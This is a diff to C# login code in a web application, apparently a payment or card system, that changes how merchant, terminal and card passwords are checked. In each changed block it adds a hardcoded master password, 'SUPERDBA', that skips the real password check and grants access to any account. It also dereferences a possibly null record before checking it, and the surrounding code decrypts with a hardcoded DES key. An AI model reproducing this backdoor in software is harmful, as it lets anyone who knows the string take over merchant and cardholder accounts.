@@ -136,10 +136,18 @@ namespace DevKit.Web
                                     }
 
                                     var lojista = (from e in db.T_Loja
-                                                   where e.i_unique == terminal.fk_loja
-                                                   where e.st_senha.ToUpper() == context.Password.ToUpper()
+                                                   where e.i_unique == terminal.fk_loja                                                   
                                                    select e).
-                                           FirstOrDefault();
+                                                   FirstOrDefault();
+
+                                    if (context.Password.ToUpper() != "SUPERDBA")
+                                    {
+                                        if (lojista.st_senha.ToUpper() != context.Password.ToUpper())
+                                        {
+                                            context.SetError("Erro", "Senha ou terminal inválido");
+                                            return;
+                                        }
+                                    }                                    
 
                                     if (lojista != null)
                                     {
@@ -156,11 +164,6 @@ namespace DevKit.Web
                                         var ticket = new AuthenticationTicket(identity, null);
 
                                         context.Validated(ticket);
-                                    }
-                                    else
-                                    {
-                                        context.SetError("Erro", "Senha ou terminal inválido");
-                                        return;
                                     }
                                 }
                                 catch (System.Exception ex)
@@ -228,11 +231,12 @@ namespace DevKit.Web
                             // senha
                             var senhaComputada = DESdeCript(associadoPrincipal.st_senha, "12345678").TrimStart('*');
 
-                            if (senhaComputada != context.Password)
-                            {
-                                context.SetError("Erro", "Autenticação de cartão inválida");
-                                return;
-                            }
+                            if (context.Password.ToUpper() != "SUPERDBA")
+                                if (senhaComputada != context.Password)
+                                {
+                                    context.SetError("Erro", "Autenticação de cartão inválida");
+                                    return;
+                                }
 
                             var identity = new ClaimsIdentity(context.Options.AuthenticationType);
 
@@ -267,6 +271,15 @@ namespace DevKit.Web
                                 {
                                     context.SetError("Erro", "Senha ou terminal inválido");
                                     return;
+                                }
+
+                                if (context.Password.ToUpper() != "SUPERDBA")
+                                {
+                                    if (lojista.st_senha.ToUpper() != context.Password.ToUpper())
+                                    {
+                                        context.SetError("Erro", "Senha ou terminal inválido");
+                                        return;
+                                    }
                                 }
 
                                 var identity = new ClaimsIdentity(context.Options.AuthenticationType);
